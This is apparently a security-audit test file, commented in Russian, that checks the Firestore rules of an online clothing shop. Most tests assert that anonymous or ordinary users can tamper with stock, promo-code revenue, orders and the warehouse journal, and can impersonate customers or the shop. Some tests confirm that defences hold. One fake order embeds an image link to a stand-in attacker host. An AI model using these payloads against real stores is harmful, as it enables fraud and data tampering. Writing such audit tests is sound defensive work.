// Пробы аудита безопасности 02.10.2026. Каждый тест утверждает, что АТАКА ПРОХОДИТ (assertSucceeds) —
// зелёный тест = уязвимость подтверждена. Тесты «H*» — что защита держит (assertFails).
import { readFileSync } from 'node:fs';
import { after, before, beforeEach, describe, test } from 'node:test';
import assert from 'node:assert/strict';
import { assertFails, assertSucceeds, initializeTestEnvironment } from '@firebase/rules-unit-testing';
import { doc, getDoc, setDoc, updateDoc, serverTimestamp, collection, getDocs, query, where } from 'firebase/firestore';

const RULES = '/home/user/Wasatofficial-Shop-/firestore.rules';
let env;
const anon = () => env.unauthenticatedContext().firestore();
const guestChat = (uid = 'anon1') =>
  env.authenticatedContext(uid, { firebase: { sign_in_provider: 'anonymous' } }).firestore();
const customer = (uid = 'mallory') =>
  env.authenticatedContext(uid, { email: `${uid}@gmail.com`, email_verified: true, firebase: { sign_in_provider: 'google.com' } }).firestore();

const product = {
  id: 'p1', title: 'Пальто', price: 10000, category: 'coats', inStock: true,
  skus: [
    { id: 'p1-m', color: 'Черный', size: 'M', stock: 1, skuCode: 'WS-P1-M', barcode: '4607182930123' },
    { id: 'p1-l', color: 'Черный', size: 'L', stock: 3, skuCode: 'WS-P1-L', barcode: '4607182930130' },
  ],
};
const promo = {
  id: 'promo1', code: 'BLOGGER15', discountPercent: 15, usageLimit: 50, usedCount: 2, active: true,
  isReferral: true, partnerName: '@blogger', partnerCommissionPercent: 10, generatedRevenue: 20000, commissionEarned: 2000,
};
const realOrder = {
  id: 'WS-12345678', customerUid: 'alice', customerName: 'Алиса', customerPhone: '+79990000000', status: 'accepted',
  items: [{ product: { id: 'p1', title: 'Пальто', price: 10000 }, quantity: 1, selectedColor: 'Черный', selectedSize: 'M' }],
};

async function seed(serverOrders) {
  await env.clearFirestore();
  await env.withSecurityRulesDisabled(async (ctx) => {
    const db = ctx.firestore();
    await setDoc(doc(db, 'products/p1'), product);
    await setDoc(doc(db, 'promos/promo1'), promo);
    await setDoc(doc(db, 'orders/WS-12345678'), realOrder);
    await setDoc(doc(db, 'users/alice'), { uid: 'alice', name: 'Алиса', email: 'alice@gmail.com', bonusPoints: 500 });
    if (serverOrders !== undefined) await setDoc(doc(db, 'settings/server'), { serverOrdersEnabled: serverOrders });
  });
}
async function read(path) { let out; await env.withSecurityRulesDisabled(async (ctx) => { out = (await getDoc(doc(ctx.firestore(), path))).data(); }); return out; }

before(async () => {
  env = await initializeTestEnvironment({ projectId: 'demo-security', firestore: { rules: readFileSync(RULES, 'utf8') } });
});
after(async () => { await env?.cleanup(); });

describe('Клиентский режим (settings/server нет)', () => {
  beforeEach(() => seed(undefined));

  test('P1 без входа: то же число вариантов, но остаток 9999, чужой цвет/размер и штрихкод — проходит (обход isStockDeduction)', async () => {
    await assertSucceeds(updateDoc(doc(anon(), 'products/p1'), {
      skus: [
        { id: 'p1-m', color: 'Черный', size: 'M', stock: 9999, skuCode: 'WS-P1-M', barcode: '0000000000000' },
        { id: 'p1-l', color: 'Розовый', size: 'XXXL', stock: 0, skuCode: 'HACK', barcode: '1111111111111' },
      ],
      inStock: true,
    }));
    const p = await read('products/p1');
    assert.equal(p.skus[0].stock, 9999);
    assert.equal(p.skus[1].size, 'XXXL');
  });

  test('P2 без входа: товар раздувается до ~900 КБ при том же числе вариантов (A3 в audit-attacks проверяет только 3000 вариантов)', async () => {
    await assertSucceeds(updateDoc(doc(anon(), 'products/p1'), {
      skus: [
        { id: 'p1-m', color: 'x'.repeat(450_000), size: 'M', stock: 1 },
        { id: 'p1-l', color: 'Черный', size: 'L', stock: 3, junk: 'y'.repeat(450_000) },
      ],
    }));
  });

  test('P3 без входа: товар снимается с продажи при ненулевом остатке («Снят с витрины»)', async () => {
    await assertSucceeds(updateDoc(doc(anon(), 'products/p1'), { skus: product.skus, inStock: false }));
  });

  test('P4 без входа: 48 записей по +1 «сжигают» промокод (лимит 50) и пишут партнёру 48 млн ₽ выручки и комиссии', async () => {
    for (let i = 0; i < 48; i++) {
      const cur = await read('promos/promo1');
      await assertSucceeds(updateDoc(doc(anon(), 'promos/promo1'), {
        usedCount: cur.usedCount + 1,
        generatedRevenue: cur.generatedRevenue + 1_000_000,
        commissionEarned: cur.commissionEarned + 1_000_000,
      }));
    }
    const p = await read('promos/promo1');
    assert.equal(p.usedCount, 50);
    assert.equal(p.commissionEarned, 48_002_000);
  });

  test('P5 без входа: заказ ~900 КБ (30 строк по 30 КБ), цена строки 1 ₽, отрицательное количество, внешняя картинка, скидка 10^12', async () => {
    const items = Array.from({ length: 30 }, (_, i) => ({
      product: { id: 'p1', title: 'Пальто', price: 1, image: 'https://attacker.example/px.gif?' + i, blob: 'z'.repeat(30_000) },
      quantity: -500, selectedColor: 'Черный', selectedSize: 'M',
    }));
    await assertSucceeds(setDoc(doc(anon(), 'orders/WS-FAKE0001'), {
      id: 'WS-FAKE0001', status: 'accepted', totalPrice: 0, paymentStatus: 'pending', paymentMethod: 'Перевод',
      deliveryMethod: 'Курьер', deliveryAddress: 'x', customerName: 'Иван', customerPhone: '+7',
      discountAmount: 1e12, deliveryFee: 0, items,
      historySteps: [{ status: 'delivered', date: 'вчера', title: 'Доставлен', isCompleted: true }],
    }));
  });

  test('P6 без входа: поддельная запись журнала склада «Заказ … приход +500» по своему фальшивому заказу', async () => {
    const db = anon();
    await assertSucceeds(setDoc(doc(db, 'orders/WS-FAKE0002'), {
      id: 'WS-FAKE0002', status: 'accepted', totalPrice: 0, paymentMethod: 'x', deliveryMethod: 'x', deliveryAddress: 'x',
      customerName: 'Администратор', customerPhone: '+7',
      items: [{ product: { id: 'p1', title: 'Пальто' }, quantity: -500 }],
    }));
    await assertSucceeds(setDoc(doc(db, 'stock_movements/WS-FAKE0002_0'), {
      id: 'WS-FAKE0002_0', createdAt: new Date().toISOString(), date: 'сегодня', type: 'order', orderId: 'WS-FAKE0002',
      lineIndex: 0, productId: 'p1', productTitle: 'Пальто', skuCode: 'WS-P1-M', color: 'Черный', size: 'M',
      changeQuantity: 500, reason: 'Инвентаризация', operator: 'Администратор',
    }));
  });

  test('P7 без входа: запись журнала для ЧУЖОГО настоящего заказа (номер угадывается) — мусор в полях, запись покупателя потом отклонится', async () => {
    await assertSucceeds(setDoc(doc(anon(), 'stock_movements/WS-12345678_0'), {
      id: 'WS-12345678_0', createdAt: 'x', date: 'x', type: 'order', orderId: 'WS-12345678', lineIndex: 0,
      productId: 'p1', productTitle: 'ВОЗВРАТ БРАКА', skuCode: 'x', color: 'x', size: 'x', changeQuantity: -1,
      reason: 'Списание: кража', operator: 'Администратор',
    }));
    // настоящий покупатель (alice) после этого не может записать свою строку
    await assertFails(setDoc(doc(customer('alice'), 'stock_movements/WS-12345678_0'), {
      id: 'WS-12345678_0', createdAt: 'x', date: 'x', type: 'order', orderId: 'WS-12345678', lineIndex: 0,
      productId: 'p1', productTitle: 'Пальто', skuCode: 'WS-P1-M', color: 'Черный', size: 'M', changeQuantity: -1,
      reason: 'Заказ #WS-12345678', operator: 'Алиса',
    }));
  });

  test('P8 покупатель пишет в профиль чужую почту и телефон (в «Клиентах» его карточка заменит карточку жертвы)', async () => {
    await assertSucceeds(setDoc(doc(customer('mallory'), 'users/mallory'), {
      uid: 'mallory', name: 'Алиса', email: 'alice@gmail.com', phone: '+79990000000',
    }));
  });
});

describe('Серверный режим', () => {
  beforeEach(() => seed(true));
  test('H1 держит: в серверном режиме остатки, промокод, журнал склада и заказ напрямую — отказ', async () => {
    await assertFails(updateDoc(doc(anon(), 'products/p1'), { skus: product.skus, inStock: false }));
    await assertFails(updateDoc(doc(anon(), 'promos/promo1'), { usedCount: 3 }));
    await assertFails(setDoc(doc(anon(), 'stock_movements/WS-12345678_0'), { id: 'WS-12345678_0', type: 'order', orderId: 'WS-12345678', lineIndex: 0, productId: 'p1', changeQuantity: -1 }));
  });
});

describe('Оба режима', () => {
  beforeEach(() => seed(undefined));

  test('P9 анонимный гость чата: сообщение с id «0000-…», картинкой 850 КБ и именем «Администратор» в threadName', async () => {
    await assertSucceeds(setDoc(doc(guestChat('anon1'), 'chat_messages/0000-spam'), {
      id: '0000-spam', sender: 'user', text: 'спам', threadId: 'anon1', isInternalNote: false,
      imageUrl: 'data:image/png;base64,' + 'A'.repeat(850_000), threadName: 'Администратор', sentAt: serverTimestamp(),
    }));
  });

  test('P10 отзыв от имени магазина: authorName любой, рейтинг 5 (через любой не-анонимный вход)', async () => {
    await assertSucceeds(setDoc(doc(customer('mallory'), 'reviews/p1_mallory'), {
      id: 'p1_mallory', productId: 'p1', uid: 'mallory', authorName: 'Wasat Shop (официально)', rating: 5,
      comment: 'Ответ магазина: пишите на мой телеграм', date: 'x', createdAt: 'x',
    }));
  });

  test('H2 держит: чужие заказы, профиль, чат, заметки, себестоимость, admins, статусы поддержки, журнал', async () => {
    const m = customer('mallory');
    await assertFails(getDoc(doc(m, 'orders/WS-12345678')));
    await assertFails(getDocs(query(collection(m, 'orders'), where('customerUid', '==', 'alice'))));
    await assertFails(getDoc(doc(m, 'users/alice')));
    await assertFails(getDoc(doc(anon(), 'product_costs/p1')));
    await assertFails(getDocs(collection(m, 'customer_notes')));
    await assertFails(getDocs(collection(m, 'support_threads')));
    await assertFails(getDoc(doc(m, 'support_status/alice')));
    await assertFails(getDocs(collection(m, 'support_status')));
    await assertFails(getDocs(collection(m, 'stock_movements')));
    await assertFails(setDoc(doc(m, 'users/mallory'), { uid: 'mallory', bonusPoints: 1 }));
    await assertFails(setDoc(doc(m, 'reviews/p1_alice'), { id: 'p1_alice', productId: 'p1', uid: 'alice', authorName: 'a', rating: 1, comment: 'x', date: 'x', createdAt: 'x' }));
    await assertFails(setDoc(doc(guestChat('anon1'), 'reviews/p1_anon1'), { id: 'p1_anon1', productId: 'p1', uid: 'anon1', authorName: 'a', rating: 1, comment: 'x', date: 'x', createdAt: 'x' }));
    await assertFails(setDoc(doc(guestChat('anon1'), 'chat_messages/msg-x'), { id: 'msg-x', sender: 'admin', text: 'x', threadId: 'anon1', isInternalNote: false }));
    await assertFails(setDoc(doc(guestChat('anon1'), 'chat_messages/msg-y'), { id: 'msg-y', sender: 'user', text: 'x', threadId: 'alice', isInternalNote: false }));
    await assertFails(setDoc(doc(anon(), 'settings/server'), { serverOrdersEnabled: false }));
    await assertFails(setDoc(doc(anon(), 'orders/WS-PAID1'), { id: 'WS-PAID1', status: 'accepted', totalPrice: 1, paymentStatus: 'paid', paymentMethod: 'x', deliveryMethod: 'x', deliveryAddress: 'x', customerName: 'x', customerPhone: 'x', items: [{}] }));
    await assertFails(updateDoc(doc(customer('alice'), 'orders/WS-12345678'), { status: 'cancelled' }));
  });
});
